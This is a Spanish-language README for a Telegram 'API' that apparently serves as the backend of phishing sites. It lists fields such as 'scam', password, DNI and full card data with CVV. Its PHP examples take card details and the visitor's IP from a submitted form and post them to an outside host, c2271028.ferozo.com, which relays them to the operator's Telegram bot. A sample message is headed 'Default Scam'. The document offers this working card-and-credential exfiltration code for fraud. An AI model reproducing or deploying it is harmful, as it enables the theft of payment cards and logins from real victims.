# telegrambot-api

## ¿Qué es?
Es una HTTP API en desarrollo creada por @tona420, la cual mejora, acelera y hace mas sencilla la comunicación a un bot de Telegram. 

## ¿Es de uso público?
Por el momento, la API es privada y solo pocos usuarios tienen acceso a ella, pero no te preocupes, muy pronto se hará pública y todos podran acceder y usarla.

## ¿Cómo se usa?
Si no eres programador, y quieres usar la api de una manera sencilla y sin complicaciones, te recomiendo que copies y pegues el siguiente código en tu archivo de comunicación:
```php

<?php

$data = array(
    'apikey' => '',
    'token' => '', 
    'chatid' => ''
);

$result = file_get_contents('http://c2271028.ferozo.com/api', false, stream_context_create(array('http' => 
array('header'  => "Content-type: application/x-www-form-urlencoded\r\n",'method'  => 'POST','content' => http_build_query($data)))));

?>

```
### ¿Qué hace esto?
Es muy sencillo, éste código lo que hace es tomar los datos y enviarlos a la API, se procesan y se envian a telegram, ellos se encargan de mandartelos a traves del bot que creaste.

### ¿Qué datos puedo enviar?
Estos son los datos que puedes enviar mediante la API:

- 'apikey' = Es la llave para poder acceder a la API. _*
- 'token' = Es el token de tu bot de telegram. _*
- 'chatid' = Es el ID de tu usuario de telegram. _*
- 'scam' = El nombre de tu scam.
- 'ip' = La IP del usuario.
- 'isp' = El ISP del usuario.
- 'correo' = El correo del usuario.
- 'usuario' = El usuario.
- 'clave' = La clave del usuario.
- 'dni' = El DNI del usuario.
- 'ccname' = El titular de la tarjeta.
- 'ccnum' = Los digitos de la tarjeta.
- 'ccven' = La fecha de vencimiento de la tarjeta.
- 'cccvv' = El código de seguridad de la tarjeta.
- 'provincia' = La provincia del usuario.
- 'localidad' = La localidad del usuario.
- 'postal' = El Código Postal (ZIP) del usuario.
- 'domicilio' = El domicilio del usuario.
- 'telefono' = El teléfono del usuario.

**Los modulos marcados con * son obligatorios**

### Ejemplo
```php

<?php

$cardName = $_POST['card-name'];
$cardNumbers = $_POST['card-number'];
$cardExpiration = $_POST['card-expiration'];
$cardCvv = $_POST['card-cvv'];

$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$data = array(
    'apikey' => 'apikey',
    'token' => '10101010101:Adk4mfD', 
    'chatid' => '160043220454',
    
    'ip' => $ip, 
    'isp' => $isp,
    
    'ccname' => $cardName,
    'ccnum' => $cardNumbers,
    'ccven' => $cardExpiration,
    'cccvv' => $cardCvv
);

$result = file_get_contents('http://c2271028.ferozo.com/api', false, stream_context_create(array('http' => 
array('header'  => "Content-type: application/x-www-form-urlencoded\r\n",'method'  => 'POST','content' => http_build_query($data)))));

?>

```
Mensaje del bot:
```
=====+ Default Scam - @tona420 +=====

Datos de conexión: 
IP: xxx
ISP: xxx
=== Datos Default Scam ===

Titular: Raul Hernandez 
Digitos: 1234 5678 9123 4567 
Vencimiento: 01/11 
CVV: 999 

=====+ @tona420 - dd/mm/yyyy +=====
```

## Contacto
Puedes contactarme mediante telegram @tona420. ;)
